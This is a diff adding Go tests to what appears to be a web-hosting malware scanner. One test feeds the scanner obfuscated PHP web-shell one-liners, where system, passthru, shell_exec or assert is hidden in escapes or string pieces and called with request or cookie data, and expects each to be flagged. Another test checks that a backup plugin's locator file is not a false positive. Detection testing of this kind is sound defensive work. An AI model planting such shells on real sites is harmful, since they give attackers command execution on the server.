@@ -1927,3 +1927,63 @@ func TestFleetFakeAdobeDownloadKit(t *testing.T) {
 		}
 	}
 }
+
+// Server audit (s1, 2026-11-05): a web shell that spells the runner's name
+// in escapes or pieces and calls it with the request was not caught (the
+// plain one-liners were). Inert fixtures; look-alikes stay clean.
+func TestFleetHiddenFunctionNameShell(t *testing.T) {
+	s := newScanner(t)
+	for what, body := range map[string]string{
+		"hex name":    `<?php $f="\x73\x79\x73\x74\x65\x6d"; $f($_GET['c']); ?>`,
+		"octal name":  `<?php $r = "\160\141\163\163\164\150\162\165"; $r($_REQUEST["x"]); ?>`,
+		"pieces":      `<?php $a='sys'.'tem'; $a($_GET['c']); ?>`,
+		"mixed":       "<?php\n$k = 'shell' . \"_\\x65xec\";\necho $k($_POST['q']);\n",
+		"cookie code": `<?php $z = "as"."sert"; @$z($_COOKIE['p']); ?>`,
+	} {
+		p := "/home/u/public_html/wp-content/uploads/x.php"
+		if d := s.checkContent(p, extOf(p), []byte(body)); d == nil || d.Signature != "PHP.Backdoor.HiddenFunctionName" {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+	for what, body := range map[string]string{
+		// A name kept plainly, run on a fixed command.
+		"plain name":   "<?php\n$fn = 'exec';\n$fn('uptime', $out);\nprint_r($out);\n",
+		// Pieces that make a harmless function, with request data.
+		"escaper":      "<?php\n$e = 'esc_' . 'html';\necho $e($_GET['s']);\n",
+		"str replace":  "<?php\n$f = \"str_\" . \"replace\";\necho $f('a', 'b', $_POST['t']);\n",
+		// A runner name in pieces, never called with the request.
+		"log message":  "<?php\n$msg = 'sys' . 'tem';\nerror_log('module: ' . $msg);\n",
+		"newline text": "<?php\n$sep = \"\\n\";\necho $_GET['a'] . $sep;\n",
+	} {
+		p := "/home/u/public_html/wp-content/plugins/p/x.php"
+		if d := s.checkContent(p, extOf(p), []byte(body)); d != nil {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+}
+
+// business500 (liberato, 2026-11-05): BoldGrid Backup's
+// wp-content/.boldgrid-backup-locator.php (a direct-request guard, then
+// the backup folder's path) was quarantined as a hidden PHP file and
+// rewritten by the plugin 5,073 times. Code that guards and returns a
+// fixed text runs nothing; the same shape with request data or a call
+// stays a finding.
+func TestFleetBoldGridLocator(t *testing.T) {
+	s := newScanner(t)
+	p := "/home2/u/public_html/wp-content/.boldgrid-backup-locator.php"
+	locator := "<?php\n// phpcs:disable\n$__bg_script = isset( $_SERVER['SCRIPT_FILENAME'] ) ? (string) $_SERVER['SCRIPT_FILENAME'] : '';\n$__bg_direct = ( '' !== $__bg_script && @realpath( $__bg_script ) === @realpath( __FILE__ ) );\nif ( $__bg_direct || count( get_included_files() ) <= 1 ) {\n\theader( 'HTTP/1.1 403 Forbidden' );\n\texit;\n}\nreturn '/home2/u/boldgrid_backup';\n"
+	if d := s.checkContent(p, extOf(p), []byte(locator)); d != nil {
+		t.Errorf("locator: %+v", d)
+	}
+	for what, body := range map[string]string{
+		"request data": "<?php\nif ( count( get_included_files() ) <= 1 ) { header( 'HTTP/1.1 403' ); exit; }\n$x = $_GET['p'];\nreturn '/tmp/x';\n",
+		"other call":   "<?php\nif ( count( get_included_files() ) <= 1 ) { file_put_contents( '/tmp/a', 'b' ); exit; }\nreturn '/tmp/x';\n",
+		"include":      "<?php\ninclude '/tmp/x.jpg';\nreturn 'x';\n",
+		"var call":     "<?php\n$f = 'phpinfo';\nif ( isset( $f ) ) { $f(); }\nreturn 'x';\n",
+		"header input": "<?php\nheader( 'X: ' . $_SERVER['HTTP_X'] );\nreturn 'x';\n",
+	} {
+		if d := s.checkContent(p, extOf(p), []byte(body)); d == nil {
+			t.Errorf("%s: no finding", what)
+		}
+	}
+}
